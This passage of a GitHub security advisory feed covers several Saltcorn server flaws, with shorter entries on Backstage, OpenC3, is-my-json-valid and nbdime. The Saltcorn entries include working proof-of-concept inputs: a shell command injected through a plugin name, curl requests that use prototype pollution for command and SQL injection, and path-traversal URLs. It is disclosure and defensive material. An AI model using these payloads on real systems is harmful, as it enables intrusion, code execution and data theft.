<li>file: <a href="https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/plugins-loader/plugin_installer.js#L41-L61">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/plugins-loader/plugin_installer.js#L41-L61</a></li>
</ul>
<pre><code class="language-js">class PluginInstaller {
  constructor(plugin, opts = {}) {
    [...]
    const tokens =
      plugin.source === "npm"
        ? plugin.location.split("/")
        : plugin.name.split("/"); // [5] 
    [...]
    this.tempDir = join(this.tempRootFolder, "temp_install", ...tokens); // [6] 
    [...]
  }

  
  async install(force) {
    [...]
    if (await this.prepPluginsFolder(force, pckJSON)) { // [8] 
    [...]
  }

  async prepPluginsFolder(force, pckJSON) {
    [...]
    switch (this.plugin.source) {
      [...]
      case "git":
        if (force || !(await pathExists(this.pluginDir))) { 
          await gitPullOrClone(this.plugin, this.tempDir); // [9] 
      [...]
  }
</code></pre>
<ul>
<li>file: <a href="https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/plugins-loader/download_utils.js#L112">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/plugins-loader/download_utils.js#L112</a></li>
</ul>
<pre><code class="language-js">const gitPullOrClone = async (plugin, pluginDir) =&gt; {
  [...]
  if (fs.existsSync(pluginDir)) {
    execSync(`git ${setKey} -C ${pluginDir} pull`);
  } else {
    execSync(`git ${setKey} clone ${plugin.location} ${pluginDir}`); // [10] 
  }
  [...]
};
</code></pre>
<h3 id="poc">PoC</h3>
<ul>
<li>check that the file will be created by the command <code>echo "hello"&gt;/tmp/HACKED</code> does not exists:</li>
</ul>
<pre><code>cat /tmp/HACKED
cat: /tmp/HACKED: No such file or directory
</code></pre>
<ul>
<li>login with an admin account</li>
<li>visit <code>http://localhost:3000/plugins/new</code></li>
<li>enter the following fields:<ul>
<li>Name: <code>;echo "hello"&gt;/tmp/HACKED</code></li>
<li>Source: <code>git</code></li>
<li>other fields blank</li>
</ul>
</li>
<li>click <code>Create</code></li>
<li>you will get an error saying <code>ENOENT: no such file or directory,  ....</code> but the command <code>touch /tmp/HACKED</code> will be executed</li>
<li>to verify:</li>
</ul>
<pre><code>cat /tmp/HACKED
hello
</code></pre>
<h3 id="impact">Impact</h3>
<p>Remote code execution</p>
<h3 id="recommended-mitigation">Recommended Mitigation</h3>
<p>Sanitize the <code>pluginDir</code> value before passing to <code>execSync</code>. Alternatively, use <code>child_process. execFileSync</code> API (docs: <a href="https://nodejs.org/api/child_process.html#child_processexecfilesyncfile-args-options">https://nodejs.org/api/child_process.html#child_processexecfilesyncfile-args-options</a>)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/saltcorn/saltcorn/security/advisories/GHSA-fm76-w8jw-xf8m">https://github.com/saltcorn/saltcorn/security/advisories/GHSA-fm76-w8jw-xf8m</a></li>
<li><a href="https://github.com/saltcorn/saltcorn/commit/024f19a7e079913f62f4a2335ab04116ddb68192">https://github.com/saltcorn/saltcorn/commit/024f19a7e079913f62f4a2335ab04116ddb68192</a></li>
<li><a href="https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/plugins-loader/download_utils.js#L112">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/plugins-loader/download_utils.js#L112</a></li>
<li><a href="https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/plugins-loader/plugin_installer.js#L41-L61">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/plugins-loader/plugin_installer.js#L41-L61</a></li>
<li><a href="https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/saltcorn-data/models/plugin.ts#L44">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/saltcorn-data/models/plugin.ts#L44</a></li>
<li><a href="https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/load_plugins.js#L64-L65">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/load_plugins.js#L64-L65</a></li>
<li><a href="https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/plugins.js#L1400">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/plugins.js#L1400</a></li>
<li><a href="https://github.com/advisories/GHSA-fm76-w8jw-xf8m">https://github.com/advisories/GHSA-fm76-w8jw-xf8m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fm76-w8jw-xf8m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-03T22:21:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@saltcorn/server] @saltcorn/server Remote Code Execution (RCE) / SQL injection via prototype pollution  by manipulating `lang` and  `defstring` parameters when setting localizer strings]]></title>
        <id>https://github.com/advisories/GHSA-78p3-fwcq-62c2</id>
        <link href="https://github.com/advisories/GHSA-78p3-fwcq-62c2"/>
        <updated>2024-10-04T16:51:45.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The endpoint <code>/site-structure/localizer/save-string/:lang/:defstring</code> accepts two parameter values: <code>lang</code> and <code>defstring</code>. These values are used in an unsafe way to set the keys and value of the <code>cfgStrings</code> object. It allows to add/modify properties of the <code>Object prototype</code> that result in several logic issues, including:</p>
<ul>
<li>RCE vulnerabilities by polluting the <code>tempRootFolder</code> property </li>
<li>SQL injection vulnerabilities by polluting the <code>schema</code> property when using <code>PostgreSQL</code> database.</li>
</ul>
<h3 id="details">Details</h3>
<ul>
<li>file: <a href="https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/infoarch.js#L236-L239">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/infoarch.js#L236-L239</a></li>
</ul>
<pre><code class="language-js">router.post(
  "/localizer/save-string/:lang/:defstring",
  isAdmin,
  error_catcher(async (req, res) =&gt; {
    const { lang, defstring } = req.params; // source

    const cfgStrings = getState().getConfigCopy("localizer_strings");
    if (cfgStrings[lang]) cfgStrings[lang][defstring] = text(req.body.value); // [1] sink
    else cfgStrings[lang] = { [defstring]: text(req.body.value) };
    await getState().setConfig("localizer_strings", cfgStrings);
    res.redirect(`/site-structure/localizer/edit/${lang}`);
  })
);
</code></pre>
<h3 id="poc">PoC</h3>
<p>Setup:</p>
<ul>
<li>set <code>SALTCORN_NWORKERS=1</code> before starting the <code>saltcorn</code> server (to easily observe the behavior of the PoC)</li>
</ul>
<pre><code>SALTCORN_NWORKERS=1 saltcorn serve
</code></pre>
<ul>
<li>make sure to use PostgresSQL backend</li>
<li>login with a user with admin permission</li>
</ul>
<h4 id="rce">RCE</h4>
<p>This PoC demonstrates how to escalate the Prototype Pollution vulnerability to change the behavior of certain command executed.</p>
<ul>
<li>check that the file that will be created does not exists:</li>
</ul>
<pre><code>cat /tmp/RCE
cat: /tmp/RCE: No such file or directory
</code></pre>
<ul>
<li>pollute the <code>Object.prototype</code> with a <code>tempRootFolder</code> value set to <code>;echo+"rce"|tee+/tmp/RCE;</code> by sending the following request *** :</li>
</ul>
<pre><code class="language-bash">curl -i -X $'POST' \
    -H $'Host: localhost:3000' \
    -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'Accept: */*' \
    -H $'Origin: http://localhost:3000' \
    -H $'Connection: close' \
    -b $'loggedin=true; connect.sid=VALID_CONNECT_SID_COOKIE' \
    --data-binary $'_csrf=VALID_csrf_Value&amp;value=;echo+"rce"|tee+/tmp/RCE;' \
    $'http://localhost:3000/site-structure/localizer/save-string/__proto__/tempRootFolder'
</code></pre>
<p> visit <code>http://localhost:3000/plugins/new</code></p>
<ul>
<li>enter the following fields:<ul>
<li>Name: <code>test</code></li>
<li>Source: <code>git</code></li>
<li>other fields blank</li>
<li>click <code>Create</code></li>
</ul>
</li>
<li>you will get an error but the command <code>echo "rce" | tee /tmp/RCE</code> will be executed</li>
<li>to verify:</li>
</ul>
<pre><code>cat /tmp/RCE
rce
</code></pre>
<p>The RCE occurs because after the previous curl request, the <code>tempRootFolder</code> property is set to <code>;echo+"rce"|tee+/tmp/RCE;</code> that is later used to build the shell commands.</p>
<ul>
<li>file: <a href="https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/plugins-loader/plugin_installer.js#L45-L58">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/plugins-loader/plugin_installer.js#L45-L58</a></li>
</ul>
<pre><code class="language-js">class PluginInstaller {
  constructor(plugin, opts = {}) { // opts will have the tempRootFolder property set with dangerous values // [2]
    [...]
    this.tempRootFolder =
      opts.tempRootFolder || envPaths("saltcorn", { suffix: "tmp" }).temp; // [3]
     [...]
    this.pckJsonPath = join(this.pluginDir, "package.json");
    this.tempDir = join(this.tempRootFolder, "temp_install", ...tokens); // [4]
    [...]
  }
  [...]
}
</code></pre>
<h4 id="sql-injection">SQL Injection</h4>
<p>This PoC demonstrates how to escalate the Prototype Pollution vulnerability to change the behavior of certain SQL queries (i.e SQLi).</p>
<ul>
<li>visit <code>http://localhost:3000/table</code> to check the page returns some results (no errors)</li>
<li>pollute the <code>Object.prototype</code> with a schema value set to <code>"</code> (just to create an exception in the query that will be executed to demonstrate the issue) by sending the following request *** :</li>
</ul>
<pre><code>curl -i -X $'POST' \
    -H $'Host: localhost:3000' \
    -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'Accept: */*' \
    -H $'Origin: http://localhost:3000' \
    -H $'Connection: close' \
    -b $'loggedin=true; connect.sid=VALID_CONNECT_SID_COOKIE' \
    --data-binary $'_csrf=VALID_csrf_Value&amp;value=\"' \
    $'http://localhost:3000/site-structure/localizer/save-string/__proto__/schema'
</code></pre>
<ul>
<li>visit again <code>http://localhost:3000/table</code> but this time an SQL error will appear:</li>
</ul>
<pre><code>syntax error at or near "" order by lower(""
</code></pre>
<p><strong>NOTE</strong>: Another payload to use as <code>value</code> could be <code>pg_user"+WHERE+1=1+AND+(SELECT+pg_sleep(5))+IS+NOT+NULL+--</code></p>
<p>The SQL injection occurs because after the previous curl request, the <code>schema</code> property is set to <code>"</code>.</p>
<ul>
<li>file: <a href="https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/postgres/postgres.js#L101">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/postgres/postgres.js#L101</a></li>
</ul>
<pre><code class="language-js">const select = async (tbl, whereObj, selectopts = {}) =&gt; { // [2] selectopts
  const { where, values } = mkWhere(whereObj);
  const schema = selectopts.schema || getTenantSchema(); // [3] selectopts.schema
  const sql = `SELECT ${
    selectopts.fields ? selectopts.fields.join(", ") : `*`
  } FROM "${schema}"."${sqlsanitize(tbl)}" ${where} ${mkSelectOptions( // [4] schema
    selectopts,
    values,
    false
  )}`;
  sql_log(sql, values);
  const tq = await (client || selectopts.client || pool).query(sql, values);

  return tq.rows;
};
</code></pre>
<p>*** Retrieve valid values for the <code>connect.sid</code> (<code>VALID_CONNECT_SID_COOKIE</code>) and <code>_csrf</code> values (<code>VALID_csrf_Value</code>) :</p>
<ul>
<li>open the browser developer console and go to the <code>Network</code> tab</li>
<li>visit <code>http://localhost:3000/site-structure/localizer/add-lang</code></li>
<li>add a language (<code>Name: test</code> , <code>Locale: test</code>) and click <code>Save</code></li>
<li>under the <code>Network</code> tab, filter for <code>save-lang</code> and check the request parameters (<code>Headers</code> and <code>Payload</code>/<code>Request</code> tabs)</li>
<li>copy the values for <code>connect.sid</code> and <code>_csrf</code> and paste in the curl command above</li>
</ul>
<h3 id="impact">Impact</h3>
<p>Remote code execution (RCE), Sql injection and business logic errors.</p>
<h3 id="recommended-mitigation">Recommended Mitigation</h3>
<p>Check the values of <code>lang</code> and  <code>defstring</code> parameters against dangerous properties like <code>__proto__</code>, <code>constructor</code>, <code>prototype</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/saltcorn/saltcorn/security/advisories/GHSA-78p3-fwcq-62c2">https://github.com/saltcorn/saltcorn/security/advisories/GHSA-78p3-fwcq-62c2</a></li>
<li><a href="https://github.com/saltcorn/saltcorn/commit/9e066ae8ba317469053cc27e95dcdf5b6e60e12d">https://github.com/saltcorn/saltcorn/commit/9e066ae8ba317469053cc27e95dcdf5b6e60e12d</a></li>
<li><a href="https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/infoarch.js#L236-L239">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/infoarch.js#L236-L239</a></li>
<li><a href="https://github.com/advisories/GHSA-78p3-fwcq-62c2">https://github.com/advisories/GHSA-78p3-fwcq-62c2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-78p3-fwcq-62c2</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-03T19:50:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@saltcorn/server] @saltcorn/server arbitrary file and directory listing when accessing build mobile app results]]></title>
        <id>https://github.com/advisories/GHSA-cfqx-f43m-vfh7</id>
        <link href="https://github.com/advisories/GHSA-cfqx-f43m-vfh7"/>
        <updated>2024-10-04T16:51:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A user with admin permission can read arbitrary file and directory names on the filesystem by calling the <code>admin/build-mobile-app/result?build_dir_name=</code> endpoint.  The <code>build_dir_name</code> parameter is not properly validated and it's then used to construct the <code>buildDir</code> that is read. The file/directory names under the <code>buildDir</code> will be returned. </p>
<h3 id="details">Details</h3>
<ul>
<li>file: <a href="https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/admin.js#L2884-L2893">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/admin.js#L2884-L2893</a></li>
</ul>
<pre><code class="language-js">router.get(
  "/build-mobile-app/result",
  isAdmin,
  error_catcher(async (req, res) =&gt; {
    const { build_dir_name } = req.query; // [1] source
    const rootFolder = await File.rootFolder();
    const buildDir = path.join(
      rootFolder.location,
      "mobile_app",
      build_dir_name // [2]
    );
    const files = await Promise.all(
      fs
        .readdirSync(buildDir) // [3] sink
        .map(async (outFile) =&gt; await File.from_file_on_disk(outFile, buildDir))
    );
    [...]
  })
);
</code></pre>
<h3 id="poc">PoC</h3>
<ul>
<li>log into the application as an admin user</li>
<li>visit the following url: <code>http://localhost:3000/admin/build-mobile-app/result?build_dir_name=/../../../../../../../../</code></li>
</ul>
<p><strong>NOTE</strong>: it's possible to only see file and directory names but not to download their content.</p>
<h3 id="impact">Impact</h3>
<p>Information disclosure</p>
<h3 id="recommended-mitigation">Recommended Mitigation</h3>
<p>Resolve the <code>buildDir</code> and check if it starts with <code>${rootFolder.location}/mobile_app</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/saltcorn/saltcorn/security/advisories/GHSA-cfqx-f43m-vfh7">https://github.com/saltcorn/saltcorn/security/advisories/GHSA-cfqx-f43m-vfh7</a></li>
<li><a href="https://github.com/saltcorn/saltcorn/commit/81adaf78430a9b59804894574d67d2a0c7bb3dc5">https://github.com/saltcorn/saltcorn/commit/81adaf78430a9b59804894574d67d2a0c7bb3dc5</a></li>
<li><a href="https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/admin.js#L2884-L2893">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/admin.js#L2884-L2893</a></li>
<li><a href="https://github.com/advisories/GHSA-cfqx-f43m-vfh7">https://github.com/advisories/GHSA-cfqx-f43m-vfh7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cfqx-f43m-vfh7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-03T19:46:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@saltcorn/server] @saltcorn/server arbitrary file zip read and download when downloading auto backups]]></title>
        <id>https://github.com/advisories/GHSA-277h-px4m-62q8</id>
        <link href="https://github.com/advisories/GHSA-277h-px4m-62q8"/>
        <updated>2024-10-04T16:51:58.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A user with admin permission can read and download arbitrary zip files when downloading auto backups. The file name used to identify the zip file is not properly sanitized when passed to <code>res.download</code> API.</p>
<h3 id="details">Details</h3>
<ul>
<li>file: <a href="https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/admin.js#L671-L682">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/admin.js#L671-L682</a></li>
</ul>
<pre><code class="language-js">router.get(
  "/auto-backup-download/:filename",
  isAdmin,
  error_catcher(async (req, res) =&gt; {
    const { filename } = req.params; // [1] source
    [...]
    if (
      !isRoot ||
      !(filename.startsWith(backup_file_prefix) &amp;&amp; filename.endsWith(".zip")) // [2]
    ) {
      res.redirect("/admin/backup");
      return;
    }
    const auto_backup_directory = getState().getConfig("auto_backup_directory");
    res.download(path.join(auto_backup_directory, filename), filename); // [3] sink
  })
);
</code></pre>
<h3 id="steps-to-reproduce-poc">Steps to reproduce (PoC)</h3>
<ul>
<li>create a file with <code>.zip</code> extension under <code>/tmp</code> folder:</li>
</ul>
<pre><code>echo "secret12345" &gt; /tmp/secret.zip
</code></pre>
<ul>
<li>log into the application as an admin user</li>
<li>visit the url   <code>http://localhost:3000/admin/auto-backup-download/sc-backup-%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2ftmp%2fsecret.zip</code></li>
<li>download the zip file and then check if the zip was indeed downloaded:</li>
</ul>
<pre><code class="language-bash">cat secret.zip
secret12345
</code></pre>
<ul>
<li>Alternatively send the following request to retrieve the file just created.</li>
</ul>
<pre><code class="language-bash">curl -i -X $'GET' \
    -H $'Host: localhost:3000' \
    -H $'Connection: close' \
    -b $'connect.sid=VALID_CONNECT_SID_COOKIE' \
    $'http://localhost:3000/admin/auto-backup-download/sc-backup-%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2ftmp%2fsecret.zip'
</code></pre>
<p><strong>NOTE</strong>:
To obtain a valid <code>connect.sid</code> cookie, just open the developer console while logged and retrieve the cookie value.</p>
<h3 id="impact">Impact</h3>
<p>Arbitrary zip files download (information disclosure).</p>
<h3 id="recommended-mitigation">Recommended Mitigation</h3>
<p>Resolve the <code>filename</code> parameter before checking if it starts with <code>backup_file_prefix</code> .</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/saltcorn/saltcorn/security/advisories/GHSA-277h-px4m-62q8">https://github.com/saltcorn/saltcorn/security/advisories/GHSA-277h-px4m-62q8</a></li>
<li><a href="https://github.com/saltcorn/saltcorn/commit/024f19a7e079913f62f4a2335ab04116ddb68192">https://github.com/saltcorn/saltcorn/commit/024f19a7e079913f62f4a2335ab04116ddb68192</a></li>
<li><a href="https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/admin.js#L671-L682">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/admin.js#L671-L682</a></li>
<li><a href="https://github.com/advisories/GHSA-277h-px4m-62q8">https://github.com/advisories/GHSA-277h-px4m-62q8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-277h-px4m-62q8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-03T19:46:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@backstage/plugin-app-backend] Unexpected visibility of environment variable configurations in @backstage/plugin-app-backend]]></title>
        <id>https://github.com/advisories/GHSA-qc4v-xq2m-65wc</id>
        <link href="https://github.com/advisories/GHSA-qc4v-xq2m-65wc"/>
        <updated>2024-10-03T18:41:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Configuration supplied through <code>APP_CONFIG_*</code> environment variables, for example <code>APP_CONFIG_backend_listen_port=7007</code>, where unexpectedly ignoring the visibility defined in configuration schema. This occurred even if the configuration schema specified that they should have backend or secret visibility. This was an intended feature of the <code>APP_CONFIG_*</code> way of supplying configuration, but now clearly goes against the expected behavior of the configuration system. This behavior leads to a risk of potentially exposing sensitive configuration details intended to remain private or restricted to backend processes.</p>
<h3 id="patches">Patches</h3>
<p>The issue has been resolved in version <code>0.3.75</code> of the <code>@backstage/plugin-app-backend</code> package. Users are encouraged to upgrade to this version to mitigate the vulnerability.</p>
<h3 id="workarounds">Workarounds</h3>
<p>As a temporary measure, avoid supplying secrets using the <code>APP_CONFIG_</code> configuration pattern. Consider alternative methods for setting secrets, such as the <a href="https://backstage.io/docs/conf/writing#environment-variable-substitution">environment substitution</a> available for Backstage configuration.</p>
<h3 id="references">References</h3>
<p>If you have any questions or comments about this advisory:</p>
<p>Open an issue in the <a href="https://github.com/backstage/backstage">Backstage repository</a>
Visit our Discord, linked to in <a href="https://github.com/backstage/backstage">Backstage README</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/backstage/backstage/security/advisories/GHSA-qc4v-xq2m-65wc">https://github.com/backstage/backstage/security/advisories/GHSA-qc4v-xq2m-65wc</a></li>
<li><a href="https://github.com/backstage/backstage/commit/323e6129073c5cb4cc106a1239eaec31a129554f">https://github.com/backstage/backstage/commit/323e6129073c5cb4cc106a1239eaec31a129554f</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47762">https://nvd.nist.gov/vuln/detail/CVE-2024-47762</a></li>
<li><a href="https://github.com/advisories/GHSA-qc4v-xq2m-65wc">https://github.com/advisories/GHSA-qc4v-xq2m-65wc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qc4v-xq2m-65wc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-03T16:51:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@openc3/tool-common] OpenC3 stores passwords in clear text (`GHSL-2024-129`)]]></title>
        <id>https://github.com/advisories/GHSA-4xqv-47rm-37mm</id>
        <link href="https://github.com/advisories/GHSA-4xqv-47rm-37mm"/>
        <updated>2024-10-02T21:41:53.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>OpenC3 COSMOS stores the password of a user unencrypted in the LocalStorage of a web browser. This makes the user password susceptible to exfiltration via Cross-site scripting (see GHSL-2024-128).</p>
<p>Note: This CVE only affects Open Source edition, and not OpenC3 COSMOS Enterprise Edition</p>
<h3 id="impact">Impact</h3>
<p>This issue may lead to Information Disclosure.</p>
<p><strong>NOTE:</strong> The complete advisory with much more information is added as <a href="https://github.com/OpenC3/cosmos/security/advisories/GHSA-4xqv-47rm-37mm#advisory-comment-104905">comment</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/OpenC3/cosmos/security/advisories/GHSA-4xqv-47rm-37mm">https://github.com/OpenC3/cosmos/security/advisories/GHSA-4xqv-47rm-37mm</a></li>
<li><a href="https://github.com/OpenC3/cosmos/commit/b5ab34fe7fa54c0c8171c4aa3caf4e03d6f63bd7">https://github.com/OpenC3/cosmos/commit/b5ab34fe7fa54c0c8171c4aa3caf4e03d6f63bd7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47529">https://nvd.nist.gov/vuln/detail/CVE-2024-47529</a></li>
<li><a href="https://github.com/advisories/GHSA-4xqv-47rm-37mm">https://github.com/advisories/GHSA-4xqv-47rm-37mm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4xqv-47rm-37mm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-02T19:29:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@openc3/tool-common] OpenC3 Cross-site Scripting in Login functionality (`GHSL-2024-128`)]]></title>
        <id>https://github.com/advisories/GHSA-vfj8-5pj7-2f9g</id>
        <link href="https://github.com/advisories/GHSA-vfj8-5pj7-2f9g"/>
        <updated>2024-10-04T22:05:08.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The login functionality contains a reflected cross-site scripting (XSS) vulnerability.</p>
<p>Note: This CVE only affects Open Source Edition, and not OpenC3 COSMOS Enterprise Edition</p>
<h3 id="impact">Impact</h3>
<p>This issue may lead up to Remote Code Execution (RCE).</p>
<p><strong>NOTE:</strong> The complete advisory with much more information is added as <a href="https://github.com/OpenC3/cosmos/security/advisories/GHSA-vfj8-5pj7-2f9g#advisory-comment-104904">comment</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/OpenC3/cosmos/security/advisories/GHSA-vfj8-5pj7-2f9g">https://github.com/OpenC3/cosmos/security/advisories/GHSA-vfj8-5pj7-2f9g</a></li>
<li><a href="https://github.com/OpenC3/cosmos/commit/762d7e0e93bdc2f340b1e42acccedc78994a576e">https://github.com/OpenC3/cosmos/commit/762d7e0e93bdc2f340b1e42acccedc78994a576e</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43795">https://nvd.nist.gov/vuln/detail/CVE-2024-43795</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/openc3/CVE-2024-43795.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/openc3/CVE-2024-43795.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-vfj8-5pj7-2f9g">https://github.com/advisories/GHSA-vfj8-5pj7-2f9g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vfj8-5pj7-2f9g</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-02T19:29:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[is-my-json-valid] Regular Expression Denial of Service in is-my-json-valid]]></title>
        <id>https://github.com/advisories/GHSA-f522-ffg8-j8r6</id>
        <link href="https://github.com/advisories/GHSA-f522-ffg8-j8r6"/>
        <updated>2024-10-02T17:16:13.000Z</updated>
        <content type="html"><![CDATA[<p>Version of <code>is-my-json-valid</code> before 1.4.1 or 2.17.2 are vulnerable to regular expression denial of service (ReDoS) via the email validation function.</p>
<h2 id="recommendation">Recommendation</h2>
<p>Update to version 1.4.1, 2.17.2 or later.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2016-2537">https://nvd.nist.gov/vuln/detail/CVE-2016-2537</a></li>
<li><a href="https://github.com/mafintosh/is-my-json-valid/pull/159">https://github.com/mafintosh/is-my-json-valid/pull/159</a></li>
<li><a href="https://github.com/mafintosh/is-my-json-valid/commit/b3051b277f7caa08cd2edc6f74f50aeda65d2976">https://github.com/mafintosh/is-my-json-valid/commit/b3051b277f7caa08cd2edc6f74f50aeda65d2976</a></li>
<li><a href="https://github.com/advisories/GHSA-f522-ffg8-j8r6">https://github.com/advisories/GHSA-f522-ffg8-j8r6</a></li>
<li><a href="https://www.npmjs.com/advisories/572">https://www.npmjs.com/advisories/572</a></li>
<li><a href="https://www.npmjs.com/advisories/76">https://www.npmjs.com/advisories/76</a></li>
<li><a href="https://hackerone.com/reports/317548">https://hackerone.com/reports/317548</a></li>
<li><a href="https://github.com/mafintosh/is-my-json-valid/commit/eca4beb21e61877d76fdf6bea771f72f39544d9b">https://github.com/mafintosh/is-my-json-valid/commit/eca4beb21e61877d76fdf6bea771f72f39544d9b</a></li>
<li><a href="https://github.com/github/advisory-database/pull/4850">https://github.com/github/advisory-database/pull/4850</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f522-ffg8-j8r6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2017-10-24T18:33:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nbdime-jupyterlab] Stored XSS in Jupyter nbdime]]></title>
        <id>https://github.com/advisories/GHSA-p6rw-44q7-3fw4</id>
        <link href="https://github.com/advisories/GHSA-p6rw-44q7-3fw4"/>
        <updated>2024-10-01T19:31:58.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Improper handling of user controlled input caused a stored cross-site scripting (XSS) vulnerability. All previous versions of nbdime are affected.</p>
<h3 id="patches">Patches</h3>
<p>Security patches will be released for each of the major versions of the nbdime packages since version 1.x of the nbdime python package.</p>
<h4 id="python">Python</h4>
<ul>
<li>nbdime 1.x: Patched in v. 1.1.1</li>
<li>nbdime 2.x: Patched in v. 2.1.1</li>
<li>nbdime 3.x: Patched in v. 3.1.1</li>
</ul>
<h4 id="npm">npm</h4>
<ul>
<li>nbdime 6.x version: Patched in 6.1.2</li>
<li>nbdime 5.x version: Patched in 5.0.2</li>
<li>nbdime-jupyterlab 1.x version: Patched in 1.0.1</li>
<li>nbdime-jupyterlab 2.x version: Patched in 2.1.1</li>
</ul>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory email us at <a href="mailto:security@ipython.org">security@ipython.org</a>.</p>
<h3 id="references">References</h3>
<ul>
